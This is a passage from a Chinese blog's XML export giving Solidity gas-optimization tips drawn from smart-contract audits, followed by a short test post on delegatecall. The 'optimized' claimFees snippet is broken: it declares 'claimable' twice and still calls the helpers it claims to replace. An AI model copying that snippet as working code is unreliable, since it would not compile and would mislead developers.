<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setApprovalForAll(address operator, bool approved) public &#123;</span><br><span class="line">    if (isApprovedForAll[msg.sender][operator] == approved) return;   //先判断</span><br><span class="line">    isApprovedForAll[msg.sender][operator] = approved;</span><br><span class="line">    emit ApprovalForAll(msg.sender, operator, approved);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="循环中避免昂贵的操作"><a href="#循环中避免昂贵的操作" class="headerlink" title="循环中避免昂贵的操作"></a>循环中避免昂贵的操作</h3><p>应该尽量避免在循环语句中进行昂贵的操作，比如读写存储操作，复杂的计算，外部调用和发送事情等。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setPoolFeeBulk(</span><br><span class="line">    address[] calldata _poolTokens,</span><br><span class="line">    uint256[] calldata _newFees</span><br><span class="line">)</span><br><span class="line">    external</span><br><span class="line">    onlyMaster</span><br><span class="line">&#123;</span><br><span class="line">    uint256 i;</span><br><span class="line">    uint256 l = _poolTokens.length;</span><br><span class="line"></span><br><span class="line">    while (i &lt; l) &#123;</span><br><span class="line"></span><br><span class="line">        _checkValue(</span><br><span class="line">            _newFees[i]</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        WISE_LENDING.setPoolFee(</span><br><span class="line">            _poolTokens[i],</span><br><span class="line">            _newFees[i]</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        emit PoolFeeChanged(       </span><br><span class="line">            _poolTokens[i],</span><br><span class="line">            _newFees[i],</span><br><span class="line">            block.timestamp</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        unchecked &#123;</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>while循环中发送事件，会消耗更多的gas，应避免这种情况。</p>
<h3 id="循环中避免创建memory变量"><a href="#循环中避免创建memory变量" class="headerlink" title="循环中避免创建memory变量"></a>循环中避免创建memory变量</h3><p>不在循环中创建memory变量，可以减少每次循环创建memory变量的gas成本。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract VarInLoop &#123;</span><br><span class="line">    uint256[] numbers = [1,2,3,4,5];</span><br><span class="line">    uint256 total;</span><br><span class="line">    function double(uint256 num) public pure returns(uint256 ans) &#123;</span><br><span class="line">        ans = num * 2;</span><br><span class="line">    &#125;</span><br><span class="line">    function doubleNumbers() public &#123;</span><br><span class="line">        uint256 len = numbers.length;</span><br><span class="line">        for(uint256 i; i &lt; len; ++i) &#123;</span><br><span class="line">            uint256 doubleNum =  double(numbers[i]);</span><br><span class="line">            total = total + doubleNum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>优化后，可节省gas</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract VarOutLoop &#123;</span><br><span class="line">    uint256[] numbers = [1,2,3,4,5];</span><br><span class="line">    uint256 total;</span><br><span class="line">    function double(uint256 num) public pure returns(uint256 ans) &#123;</span><br><span class="line">        ans = num * 2;</span><br><span class="line">    &#125;</span><br><span class="line">    function doubleNumbers() public &#123;</span><br><span class="line">        uint256 len = numbers.length;</span><br><span class="line">        uint256 doubleNum;                //在循环外定义变量</span><br><span class="line">        for(uint256 i; i &lt; len; ++i) &#123;</span><br><span class="line">            doubleNum =  double(numbers[i]);</span><br><span class="line">            total = total + doubleNum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="代码优化"><a href="#代码优化" class="headerlink" title="代码优化"></a>代码优化</h2><h3 id="重构重复的代码"><a href="#重构重复的代码" class="headerlink" title="重构重复的代码"></a>重构重复的代码</h3><p>重复的代码结合上下文，可通过复用重构实现。<strong>注：这可能会影响程序原有的扩展性。</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claimFees(address token) external &#123;</span><br><span class="line">    updateFeeCredit(token, msg.sender);</span><br><span class="line">    uint256 claimable = getClaimableFees(token, msg.sender);</span><br><span class="line">    if (claimable == 0) revert NoFeesToClaim();</span><br><span class="line">    tokensData[token].unclaimedFees[msg.sender] = 0;</span><br><span class="line">    payable(msg.sender).transfer(claimable);</span><br><span class="line">    emit FeesClaimed(token, msg.sender, claimable);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function updateFeeCredit(address token, address account) internal &#123;</span><br><span class="line">    TokenData storage data = tokensData[token];</span><br><span class="line">    uint256 balance = balanceOf(token, account);</span><br><span class="line">    if (balance &gt; 0) &#123;</span><br><span class="line">        uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;</span><br><span class="line">        data.unclaimedFees[account] += owed / PRECISION;</span><br><span class="line">        data.userFeeOffset[account] = data.cumulativeFeePerToken;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getClaimableFees(address token, address account) public view returns (uint256) &#123;</span><br><span class="line">    TokenData storage data = tokensData[token];</span><br><span class="line">    uint256 balance = balanceOf(token, account);</span><br><span class="line">    uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[account]) * balance;</span><br><span class="line">    return (owed / PRECISION) + data.unclaimedFees[account];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>函数claimFees中调用了2个函数（updateFeeCredit和getClaimableFees），这个2个函数中包含了重复的实现</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TokenData storage data = tokensData[token];</span><br><span class="line">uint256 balance = balanceOf(token, account);</span><br></pre></td></tr></table></figure></div>
<p>通过重构原来的实现，可节省gas</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claimFees(address token) external &#123;</span><br><span class="line">    updateFeeCredit(token, msg.sender);</span><br><span class="line">    uint256 claimable = getClaimableFees(token, msg.sender);</span><br><span class="line">    TokenData storage data = tokensData[token];</span><br><span class="line">    uint256 balance = balanceOf(token, msg.sender);</span><br><span class="line">    if (balance &gt; 0) &#123;</span><br><span class="line">        uint256 owed = (data.cumulativeFeePerToken - data.userFeeOffset[msg.sender]) * balance;</span><br><span class="line">        data.unclaimedFees[msg.sender] += owed / PRECISION;</span><br><span class="line">        data.userFeeOffset[msg.sender] = data.cumulativeFeePerToken;</span><br><span class="line">   &#125;</span><br><span class="line">    uint256 owed_ = (data.cumulativeFeePerToken - data.userFeeOffset[msg.sender]) * balance;</span><br><span class="line">    uint256 claimable = (owed_ / PRECISION) + data.unclaimedFees[msg.sender];</span><br><span class="line">    if (claimable == 0) revert NoFeesToClaim();</span><br><span class="line">    tokensData[token].unclaimedFees[msg.sender] = 0;</span><br><span class="line">    payable(msg.sender).transfer(claimable);</span><br><span class="line">    emit FeesClaimed(token, msg.sender, claimable);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="使用更优的库函数"><a href="#使用更优的库函数" class="headerlink" title="使用更优的库函数"></a>使用更优的库函数</h3><p>将引用库多个函数调用合并为单个操作，利用直接按位操作，可减少多个函数调用相关的开销。<br>如，当前使用的库<code>LiquidityChunkOriginal</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">library LiquidityChunkOriginal &#123;</span><br><span class="line">    function createChunk(</span><br><span class="line">        uint256 self,</span><br><span class="line">        int24 _tickLower,</span><br><span class="line">        int24 _tickUpper,</span><br><span class="line">        uint128 amount</span><br><span class="line">    ) internal pure returns (uint256) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            return addLiquidity(self, amount) + addTickLower(self, _tickLower) + addTickUpper(self, _tickUpper);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function addLiquidity(uint256 self, uint128 amount) internal pure returns (uint256) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            return self + uint256(amount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function addTickLower(uint256 self, int24 _tickLower) internal pure returns (uint256) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            return self + (uint256(uint24(_tickLower)) &lt;&lt; 232);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function addTickUpper(uint256 self, int24 _tickUpper) internal pure returns (uint256) &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            return self + ((uint256(uint24(_tickUpper))) &lt;&lt; 208);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>优化后的库<code>LiquidityChunkOptimized</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">library LiquidityChunkOptimized &#123;</span><br><span class="line">    function createChunk(</span><br><span class="line">        uint256 self,</span><br><span class="line">        int24 _tickLower,</span><br><span class="line">        int24 _tickUpper,</span><br><span class="line">        uint128 amount</span><br><span class="line">    ) internal pure returns (uint256) &#123;</span><br><span class="line">        return uint256(uint24(_tickLower)) &lt;&lt; 232 | uint256(uint24(_tickUpper)) &lt;&lt; 208 | uint256(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


<h3 id="删除多余的代码"><a href="#删除多余的代码" class="headerlink" title="删除多余的代码"></a>删除多余的代码</h3><ul>
<li><p>两次进行函数修改器的调用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function depositEth(uint256 _vaultId) external payable vaultExists(_vaultId) vaultExists(_vaultId) &#123;</span><br><span class="line">    _vaultERC20s[ETH][_vaultId] += msg.value;</span><br><span class="line">    emit ERC20Deposited(_vaultId, ETH, msg.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>重复的处理逻辑</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function placeBid(address _nftAddress, uint256 _tokenId, Auction memory _auction, uint256 _bid)</span><br><span class="line">    external</span><br><span class="line">    nonReentrant</span><br><span class="line">    returns (Auction memory)</span><br><span class="line">&#123;</span><br><span class="line">    _placeBidChecks(_nftAddress, _tokenId, _auction, _bid);</span><br><span class="line">     </span><br><span class="line">    uint256 currentHighestBid = _auction.highestBid;</span><br><span class="line">    // 以下判断在函数_placeBidChecks()中已有处理</span><br><span class="line">    if (_bid == 0 || (currentHighestBid.mulDivDown(_BPS + MIN_INCREMENT_BPS, _BPS) &gt;= _bid)) &#123;</span><br><span class="line">        revert MinBidError(_bid);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function _placeBidChecks(address _nftAddress, uint256 _tokenId, Auction memory _auction, uint256 _bid)</span><br><span class="line">    internal</span><br><span class="line">    view</span><br><span class="line">    virtual</span><br><span class="line">&#123;</span><br><span class="line">    _checkAuction(_nftAddress, _tokenId, _auction);</span><br><span class="line">    if (_bid == 0 || (_auction.highestBid.mulDivDown(_BPS + MIN_INCREMENT_BPS, _BPS) &gt;= _bid)) &#123;</span><br><span class="line">        revert MinBidError(_bid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>多余的函数参数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function createWithPermit(</span><br><span class="line">    uint256 tokenId,</span><br><span class="line">    address owner,</span><br><span class="line">    address recipient,</span><br><span class="line">    uint256 deadline,</span><br><span class="line">    uint8 v,</span><br><span class="line">    bytes32 r,</span><br><span class="line">    bytes32 s</span><br><span class="line">) external override &#123;</span><br><span class="line">    if (msg.sender != owner) &#123;</span><br><span class="line">        revert Unauthorized();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nonfungiblePositionManager.permit(address(this), tokenId, deadline, v, r, s);</span><br><span class="line">    nonfungiblePositionManager.safeTransferFrom(owner, address(this), tokenId, abi.encode(recipient));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>去掉参数<code>owner</code>，直接使用<code>msg.sender</code>。</p>
</li>
</ul>
<h3 id="仅使用一次的存储变量无需缓存"><a href="#仅使用一次的存储变量无需缓存" class="headerlink" title="仅使用一次的存储变量无需缓存"></a>仅使用一次的存储变量无需缓存</h3><p>当存储变量在当前函数中，只被读取一次，就不用缓存变量进行缓存，导致消耗更多的gas。直接使用即可。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setWhitelist(bytes32 merkleRoot) external &#123;</span><br><span class="line">    uint256 supply = curvesTokenSupply[msg.sender];   //只使用一次</span><br><span class="line">    if (supply &gt; 1) revert CurveAlreadyExists();</span><br><span class="line">    if (presalesMeta[msg.sender].merkleRoot != merkleRoot) &#123;</span><br><span class="line">        presalesMeta[msg.sender].merkleRoot = merkleRoot;</span><br><span class="line">        emit WhitelistUpdated(msg.sender, merkleRoot);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="避免死代码"><a href="#避免死代码" class="headerlink" title="避免死代码"></a>避免死代码</h3><p>死代码是指永远也不会执行的代码，例如某个条件永远不可能满足，消耗了以太坊 gas 但没有任何作用。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (balance &lt; 100) &#123;</span><br><span class="line">    if (balance &gt; 300) &#123;</span><br><span class="line">        ...</span><br><span class="line">        return balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
      <tags>
        <tag>智能合约安全审计</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>test</title>
    <url>/2024/09/05/test/</url>
    <content><![CDATA[<p>当用户A通过合约B来delegatecall合约C的时候，执行的是合约C的函数，但是上下文仍是合约B的：msg.sender是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约B的变量上。<br>当用户A通过合约B来delegatecall合约C的时候，执行的是合约C的函数，但是上下文仍是合约B的：msg.sender是A的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约B的变量上。</p>
<img lazyload src="/images/loading.svg" data-src="/2024/09/05/test/2023060902.jpg" class alt="alt text">
<img lazyload src="/images/loading.svg" data-src="/2024/09/05/test/2023060901.jpg" class alt="alt text">]]></content>
  </entry>
</search>
